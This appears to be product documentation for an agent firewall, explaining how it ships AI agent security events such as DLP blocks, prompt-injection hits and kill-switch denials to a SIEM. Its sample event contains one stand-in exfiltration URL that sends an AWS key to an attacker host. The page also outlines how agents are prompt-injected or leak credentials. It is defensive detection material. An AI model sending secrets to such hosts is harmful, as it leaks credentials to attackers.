---
title: "AI Agent Security Event Logging: Ship Agent Events to Your SIEM"
linkTitle: "Agent SIEM Logging"
seoTitle: "AI Agent Security Event Logging for Your SIEM"
subtitle: "Prompt injection, secret exfiltration, and rogue tool calls happen at the agent boundary. Your SIEM never sees them unless something at that boundary emits them."
description: "Ship AI agent security events to your SIEM: blocked requests, prompt injection hits, and kill-switch activations over webhook, syslog, or OTLP."
date: 2026-07-21
lastmod: 2026-07-21
learn_cat: operator
level: intermediate
tags:
  - siem
  - logging
  - detection
  - soc
  - emit
related:
  - agent-evidence-detection-integration
  - operator-console
  - what-did-my-agent-do
  - ai-runtime-security
faq:
  - q: "Why doesn't my existing SIEM see AI agent attacks?"
    a: "Because the interesting events happen inside allowed channels. A prompt injection arrives in the body of a 200 response from a site your firewall permits. A leaked credential leaves inside an HTTPS request to a well-known API. An MCP tool call never crosses the network at all when the tool server is a local subprocess. Network and endpoint telemetry record a healthy-looking connection or a normal process. Something has to sit at the agent boundary, judge the traffic, and emit a security event when it acts. That is what an agent firewall's event stream is for."
  - q: "Which Pipelock events reach the SIEM, and which stay local?"
    a: "Warn and critical events go to the emit sinks: blocked requests, behavioral and session anomalies, prompt injection detections in responses and WebSocket frames, unknown MCP tool calls, adaptive escalations, processing errors, and kill-switch denials. Info-level events such as allowed requests, tunnel open and close, and WebSocket lifecycle stay local; config_reload is the documented exception when the sink threshold allows info. If you want allowed-traffic visibility in your SIEM, ship the local logs with a collector or scrape the Prometheus metrics; pushing every allowed request through the event pipe would bury the signal."
  - q: "What formats can Pipelock emit?"
    a: "Three sinks share one JSON envelope: webhook (HTTP POST), syslog (RFC 5424), and OTLP over HTTP protobuf, which wraps the envelope in an OTLP LogRecord. Enterprise builds add a durable HTTP forwarder that spools events to an append-only local file and delivers at-least-once, so an outage or a restart does not drop the record of an attack."
  - q: "Can the SIEM pipe itself be used to exfiltrate data?"
    a: "It is an egress channel, so it has to be treated as one. Pipelock's enterprise forwarder requires an exact-hostname destination allowlist with no forward-anywhere default, refuses redirects, and re-checks the already validated address in the connection path so a DNS rebind cannot swap the destination after the check. Link-local, multicast, and cloud-metadata addresses are denied. Loopback or private SIEM targets must be explicit IP literals that match the allowlist exactly. A bearer token over plaintext HTTP to a non-loopback host is rejected outright."
  - q: "Is the event stream the same thing as the signed receipts?"
    a: "No, and the difference matters. Events are push telemetry for detection: fast, best-effort on the free sinks, shaped for a SOC pipeline. Receipts are signed, hash-chained evidence for proof: verifiable offline against a pinned key. Use events to find out something happened in near real time; use receipts to prove what happened after the fact. The forwarder is a delivery pipe for events, not a second evidence database."
---

Your agents browse, call APIs, and execute MCP tools all day. When one of them gets prompt-injected, starts leaking a credential, or calls a tool it should not, where does that show up in your SOC?

For most teams the honest answer is: nowhere. The network firewall logged an allowed HTTPS connection. The endpoint agent saw a normal process making normal syscalls. The SIEM has no row for "the model was told to reclassify its instructions" because nothing in the pipeline understood the traffic well enough to say so. Security teams are starting to call this the agent-layer logging gap, and closing it is a prerequisite for putting agents anywhere near production data.

Pipelock closes it at the enforcement point. The proxy already decides allow, warn, or block for every mediated request, response, WebSocket frame, and MCP tool call. Every decision worth a SOC's attention is emitted as a structured event you can route to whatever you already run.

## v3.7 request correlation and interception timing

`emit.correlation_header` copies a bounded, DLP-clean request header into webhook, syslog, CEF, OCSF and OTLP events on HTTP-capable transports. It doesn't enter receipts or local audit logs. Treat it as correlation data supplied by the caller, not proof of caller identity.

The `intercept_http` event records response status and size, total duration, upstream-header wait when reached, and client cancellation. It honors `logging.include_allowed`. These timing records describe mediated TLS-intercepted requests; they don't measure direct traffic. Generated request IDs now use `req-<UUIDv7>`, so update parsers that assumed a counter. Read the [v3.7 upgrade guide](/learn/pipelock-v370-upgrade/).

## One envelope, three sinks

Webhook (HTTP POST), syslog (RFC 5424), and OTLP (OpenTelemetry HTTP/protobuf) all carry the same JSON envelope, so your parser is written once:

```json
{
  "severity": "warn",
  "type": "blocked",
  "timestamp": "2026-02-25T12:34:56.789Z",
  "pipelock_instance": "prod-node-1",
  "fields": {
    "method": "GET",
    "url": "https://attacker.example/steal?key=AKIA...",
    "scanner": "dlp",
    "reason": "AWS access key pattern detected",
    "client_ip": "10.0.0.50",
    "request_id": "req-abc-123"
  }
}
```

`severity` is hardcoded per event type, not configurable, so an operator cannot accidentally demote a kill-switch denial to info. `fields` varies by type and carries the forensic detail: which scanner fired, the reason string, the request ID you can join against local logs and receipts.

## What actually reaches the SIEM

Pipelock pushes security events only by default. `critical` covers `kill_switch_deny` (the emergency stop is denying all traffic) and adaptive escalations that upgraded a session to block. `warn` covers the working set a detection engineer cares about:

| Type | What it means |
|---|---|
| `blocked` | A request failed the scanner pipeline: DLP hit, SSRF attempt, blocklisted domain |
| `response_scan` | Prompt injection detected in an upstream response |
| `ws_blocked` / `ws_scan` | The same two classes, on WebSocket frames in either direction |
| `anomaly` / `session_anomaly` | Behavioral deviation for a request or a whole session, with a score |
| `mcp_unknown_tool` | An MCP tool call to a tool that is not registered |
| `adaptive_escalation` | A session's threat score crossed a tier; critical when the new tier blocks |
| `error` | Processing failure inside the proxy itself |

Info-level events (allowed requests, tunnel and WebSocket lifecycle) stay in local logs by design. The documented exception is `config_reload` when `min_severity` is set to `info`. A SIEM ingesting every allowed agent request pays per-GB to bury its own alerts; if you need that visibility, ship local logs through your collector or use the Prometheus metrics.

## Turning it on

The `emit` block enables any combination of sinks:

```yaml
# Emit security events to a collector and a syslog relay.
emit:
  instance_id: "pipelock-prod-1"

  webhook:
    url: "https://siem.example.com/api/events"
    min_severity: "warn"
    auth_token: "your-bearer-token"
    timeout_seconds: 5
    queue_size: 64

  syslog:
    address: "udp://syslog.example.com:514"
    min_severity: "warn"
    facility: "local0"
    tag: "pipelock"
```

Webhook delivery is asynchronous through a bounded queue, so a slow collector cannot back-pressure the proxy into stalling agent traffic.

## Durable delivery, treated as the egress channel it is

The free sinks are best-effort by design. When the record of an attack must survive a restart or a collector outage, Enterprise builds add `emit.forwarder`: events spool to an append-only local file and deliver at-least-once, with a cursor tracking what has been acknowledged.

A forwarding pipe that sends security data out of your environment is itself an egress channel, and Pipelock treats it with the same suspicion it applies to agent traffic. The destination allowlist is mandatory, matches exact hostnames only, and there is no forward-anywhere default. Redirects are refused. Hostnames that resolve to internal addresses are denied. An operator may target a loopback or private SIEM collector only by using that IP literal as the URL host and allowlisting the same literal exactly. Link-local, multicast, and cloud-metadata addresses stay denied. The connection reuses the already-checked address so a DNS rebind cannot redirect delivery after validation. Plaintext HTTP to a non-loopback host requires an explicit opt-in, and a bearer token over plaintext is rejected with no opt-in at all.

## Where to start with detection

Three rules earn their keep on day one. Page on any `critical` event: a kill-switch denial means someone or something already decided traffic must stop, and an escalation-to-block means a session crossed the line unattended. Alert on `blocked` events where `scanner` is `dlp`, because a credential pattern headed for an external host is the single highest-value catch in agent security. And watch for clusters of `response_scan` or `ws_scan` from one `pipelock_instance`: repeated injection attempts against the same agent usually mean a poisoned source it keeps returning to.

From there, join on `request_id`. The same identifier appears in local logs and in the signed receipt for the decision, which is the difference between an alert that says something happened and an investigation that can prove what happened. The [evidence and detection integration](/learn/agent-evidence-detection-integration/) guide covers that join, and the [operator console](/learn/operator-console/) gives the humans a read-only view over the same record.
